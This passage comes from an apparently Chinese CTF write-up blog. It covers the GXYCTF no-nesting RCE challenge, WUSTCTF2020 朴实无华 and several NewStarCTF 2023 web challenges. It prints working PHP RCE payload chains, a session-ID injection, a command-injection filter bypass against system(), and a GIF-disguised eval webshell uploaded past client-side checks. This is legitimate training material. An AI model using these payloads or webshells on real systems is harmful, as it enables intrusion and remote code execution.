alt="tw5"></p><p>不过这个$glue并不是必须的，默认没东西直接串起来，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw6.png" alt="tw6"></p><p>现在字符串也得到了，我么可以在传http包的时候给数据包底下加个头比如：<code>renyi:system(&#39;whoami&#39;);//</code>达到执行任意命令的目的(后面跟着注释符号，把其他的注释掉了)。</p><p>不过着这种方法我没成功。。。</p><p><code>get_defined_vars()</code>：返回所有已定义所组成的数组，不过这个和<code>getallheaders()</code>不一样，它返回的是多维数组，举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw7.png" alt="tw7"></p><p>可以看到这东西会把GET传入的参数显示在第一位</p><p><img src="/img/tw8.png" alt="tw8"></p><p>GET传入的参数可控，那我们肯定希望在这个多维数组中取出我们想要的东西：利用<code>current</code>函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通果这个函数将其取出来<br></code></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw9.png" alt="tw9"></p><p><img src="/img/tw10.png" alt="tw10"></p><p>传两个参数也可以↑</p><p>假如我们要传入的恶意代码放在GET后面(传的第一个参数为了绕过一些特定参数的检测，第二个参数放恶意代码)，那么如何通过<code>current(get_defined_vars())</code>把他取出来？</p><p>可以利用<code>end</code>函数(返回数组最后一个单元的值)，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/tw11.png" alt="tw11"></p><p>绕了个小小的圈子，现在写个简单的东西看看为啥要通过第二种方法传两个参数达到<code>RCE</code>的效果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123; <br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><br><br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造payload:<code>?exp=eval(end(current(get_defined_vars())));&amp;c=system(phpinfo());</code></p><p><img src="/img/tw12.png" alt="tw12"></p><p>可以看到成功执行了<code>system(phpinfo())</code>。解释下为什么这么写：<code>eval(end(current(get_defined_vars())));</code>这东西为了返回我们get传过去的最后一个参数的值。我一开始没加eval想着外面已经有个eval了(当时人晕了，哈哈)，里面这个eval是为了执行这些套娃函数把恶意代码翻出来，外面的eval是执行恶意代码用的，一来一回就相当于<code>eval(system(phpinfo()))</code>了。而且这第二个参数可以随便构造，反正它只检测<code>exp</code>。</p><p>第三种方法通过<code>session_id</code>执行恶意代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//作用是获取当前会话的ID,也就是cookie中的phpsession，这里要注意的一点是，phpsession中只允许出现 a-z A-Z 0-9 , - 等字符，所以不能直接插入恶意代码，可以先将其16进制编码后再插入。</span><br>测试代码：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>()));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//参考了novic4师傅的文章</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = implode(getallheaders());<br><span class="hljs-regexp">//</span>ech<br><span class="hljs-regexp">//</span>var_dump(localeconv());<br><span class="hljs-regexp">//</span>var_dump(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-regexp">//</span><span class="hljs-variable">$viper</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viper&#x27;</span>];<br><span class="hljs-regexp">//</span>@eval(<span class="hljs-variable">$viper</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/tw13.png" alt="tw13"></p><p>注意这个hex2bin，他是字符串转字符串而不是数字转数字。</p><p>现在思路就比较清晰了：<code>phpsession</code>头的值我们可以控制，先通过<code>eval(hex2bin(session_id(session_start())));</code>把我们需要的恶意代码翻出来，然后把它传给exp参数就行了(注意要把恶意代码转成十六进制！)：</p><p><code>因为我到现在还没整明白怎么用burpsuite抓本地包，所以下面的图参考了novic4师傅的图，再次感谢！</code></p><p><img src="/img/tw14.png" alt="tw14"></p><p>现在回到这个套娃题，已知过滤了<code>et</code>，<code>hex</code>等，似乎上面三种方法都用不了了。。。</p><p>看了师傅们的wp，第一个payload这么写：</p><p><code>?exp=print_r(scandir(current(localeconv())));</code></p><p>先看看这个<code>localeconv()</code>返回了什么东西：</p><p><img src="/img/tw17.png" alt="tw17"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">localeconv</span>());<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/tw15.png" alt="tw15"></p><p>第一项返回了我们想要的<code>.</code>。再利用<code>current</code>返回一维数组第一项的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw16.png" alt="tw16"></p><p>注意这里和前面那个<code>get_defined_vars</code>区分开，人家返回的是多维数组，现在我们只返回了一个数组，所以<code>current</code>后只有一个点。</p><p><code>scandir(&#39;.&#39;)</code>这东西会以数组形式返回当前目录下的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw18.png" alt="tw18"></p><p>综上，我们先通过<code>/?exp=var_dump(scandir(current(localeconv())));</code>看看当前目录下的文件都有啥(var_dump也能用<code>print_r</code>等代替：</p><p><img src="/img/tw19.png" alt="tw19"></p><p>可以看到倒数第二个文件就是flag.php了，构造payload:</p><p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p><p>因为<code>flag.php</code>在倒数第二个，所以先<code>array_reverse</code>把它转成正数第二个，然后<code>next</code>将指针向下移动直接提取第二个(前面的<code>current</code>将指针放在首位)。</p><p><img src="/img/tw20.png" alt="tw20"></p><p>也可以用<code>highlight_file()</code>函数替换，他俩差不多。</p><p>还有一种情况，比如这个flag.php的位置不特殊：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">如果flag.php的位置不特殊，可以使用<span class="hljs-title function_ invoke__">array_rand</span>()和<span class="hljs-title function_ invoke__">array_flip</span>()(<span class="hljs-title function_ invoke__">array_rand</span>()返回的是键名所以必须搭配<span class="hljs-title function_ invoke__">array_flip</span>()来交换键名、键值来获得键值，函数作用上面有写到)来随机刷新显示的内容，刷几次就出来了，所以这种情况payload：<br> ?exp=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br><span class="hljs-title function_ invoke__">array_rand</span>()这东西会返回随机一个键名，<span class="hljs-title function_ invoke__">array_flip</span>()用于交换数组中的键和值，这两个组合一下就会获得随机的一个键值。因为这东西完全随机的，所以多刷新几次才可能会出现flag！    <br></code></pre></td></tr></table></figure><p>第二种方法使用session_id：</p><p>不过正则匹配过滤了<code>hex</code>，前面的<code>eval(hex2bin(session_id(session_start())));</code>肯定没法用了，不过师傅的博客里说<code>PHPSESSIID</code>这东西可以直接给他赋值<code>flag.php</code>：</p><p>payload:<code>?exp=show_source(session_id(session_start()));</code></p><p>并加个<code>cookie</code>头：<code>cookie:PHPSESSID=flag.php</code></p><p><img src="/img/tw21.png" alt="tw21"></p><p>以上内容参考了这些师傅们的文章，感谢！：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sculptor-liu.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">03</span><span class="hljs-regexp">/20/</span>GXYCTF-<span class="hljs-number">2019</span>-%E7%A6%<span class="hljs-number">81</span>%E6%AD%A2%E5%A5%<span class="hljs-number">97</span>%E5%A8%<span class="hljs-number">83</span>/<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/LLeaves/</span>p/<span class="hljs-number">12868440</span>.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_62879498/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">124538469</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Manuffer/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120738755</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>进环境发现是这么个东西。。</p><p><img src="/img/pswh1.png" alt="pswh1"></p><p>确实和题目对应了，哈哈。他这个报错好像是个</p><p>不知道干啥就用dirsearch扫：<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>Kali下不用加后面那一串：<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/</code></p><p>扫出来两个东西：<code>index.php</code>和<code>robots.txt</code>，访问<code>robots.txt</code>：</p><p><img src="/img/pswh2.png" alt="pswh2"></p><p><code>index.php</code>就是进去这个界面，访问下这个<code>fAke_f1agggg.php</code>:</p><p><img src="/img/pswh3.png" alt="pswh3"></p><p>:(，burpsuite抓包看看什么情况：</p><p><img src="/img/pswh4.png" alt="pswh4"></p><p>芜湖，响应包里有这么个东西：<code>fl4g.php</code>，直接访问：</p><p><img src="/img/pswh5.png" alt="pswh5"></p><p>这里发现个问题：页面返回一堆乱码，但是放burpsuite的repeater模块里看又不存在，和上面那段<code>php</code>报错有关系？不太懂。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//num经过intval后要小于2020，加1再inntval要大于2021，直接用科学计数法绕过：2e4，即/?num=2e4</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<span class="hljs-comment">//md5弱等于其md5加密后，弱等于是先将字符串类型转化成相同再比较。转换的规则为，若该字符串以合法的数值开始，则使用该值，否则其值为0。找个加密前0e开头加密后仍为0e的就行了</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123; <span class="hljs-comment">//get_flag中不能有空格</span><br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);  <span class="hljs-comment">//str_ireplace函数不区分大小写。</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>过滤了<code>cat</code>，绕过姿势太多了。。<code>ca&#39;&#39;t</code>还有<code>tac</code>啥的都可以。先<code>ls</code>看看当前目录都有啥东西：</p><p>payload:<code>?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><p><code>flag&#123;7ff4de78-289c-405b-9361-313240dfdcec&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week1</title>
    <link href="/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/"/>
    <url>/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第一周</p><span id="more"></span><hr><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>题目描述：粗心的网站管理员总会泄漏一些敏感信息在Web根目录下</p><p>这题一开始想用dirsearch扫的，但是嫌时间太长了就直接试了一些我知道的敏感文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">robots.txt <span class="hljs-comment">//告诉爬虫啥能爬啥不能爬，不过没啥用，这玩意儿就像防盗门一样，真想偷东西的人才不会管你上没上锁</span><br>www.zip <span class="hljs-comment">//存网站备份文件</span><br></code></pre></td></tr></table></figure><p>VIM和Git泄露没有，就这两个文件下载再打开拼一起就是flag了。</p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>题目描述：普通的上传啦，平平淡淡才是真</p><p><img src="/img/a9.png" alt="a9"></p><p>看看源码有啥好东西没：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">var</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;file&quot;</span>);<br>            <span class="hljs-keyword">var</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">var</span> allowedExtensions = [<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>];<br>            <span class="hljs-keyword">var</span> fileExtension = file.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">toLowerCase</span>();<br>            <br>            <span class="hljs-keyword">if</span> (!file) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please select a file to upload.&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (!allowedExtensions.<span class="hljs-title function_">includes</span>(fileExtension)) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>限制了后缀，只允许上传图片。估计是前端验证？那就上传个一句话改成图片格式，burpsuite抓个包再改回去：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP">GIF89a<br><br><span class="hljs-meta">&lt;?php</span><br> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;viper&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/a10.png" alt="a10"></p><p>再改成php后缀就好了，上传路径直接显示再界面了。</p><p><img src="/img/a11.png" alt="a11"></p><p>然后直接蚁剑连，根目录底下拿flag。</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>题目描述：最初的开始</p><p>md说一嘴这题最后一步限制本地用户才能访问卡了我蛮久。。因为我看到<code>只有本地用户才能访问</code>第一想到的就是改<code>X-Forwarded-For：127.0.0.1</code>和<code>Client-Ip</code>字段，但是这俩都没用。我当时人都晕了想不明白为啥不给过。(我当时思路也错了，一直在想IP地址的问题，后面还去找了<code>Authorization</code>字段的信息)。还好当时再看安恒写的那本CTF实战从入门到提升，里面有个题用的X-Real-IP字段。。。运气好把这题做出来了~</p><p><img src="/img/a12.png" alt="a12"></p><p>GET传参，?ctf&#x3D;任意就能过了。</p><p><img src="/img/a13.png" alt="a13"></p><p>POST传参，他说把secret藏起来了，看看源码里有没有啥好东西：</p><p><code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; //大小写数字混合，一眼base64</code></p><p>解码：<code>n3wst4rCTF2023g00000d</code></p><p><img src="/img/a14.png" alt="a14"></p><p>power是否是ctfer？burpsuite抓下包看看有没有这个字段：</p><p><img src="/img/a15.png" alt="a15"></p><p>改下cookie</p><p><img src="/img/a16.png" alt="a16"></p><p>后面就是改User-Agent头和Referer头(一个浏览器信息啥的一个网址来源)。最后他会提示只有本地用户才能通过这关，<code>X-Real-IP:127.0.0.1</code>即可。(可能我这辈子都忘不了X-Real-IP这个头了)。</p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>题目描述：Err……..</p><p><img src="/img/a17.png" alt="a17"></p><p>看到这题我第一想到的就是模板注入。。然后在那试49啥的，哈哈。结果直接404了。。他说给他num1和num2，我就试着get传参了<code>?number1=1</code>,结果出了这么个东西：</p><p><img src="/img/a18.png" alt="a18"></p><p>flag就藏在里面。。这个等官方wp出来了还要看一下，这题感觉没做明白。</p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>题目描述：PHP是世界上最安全的语言，真的吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span 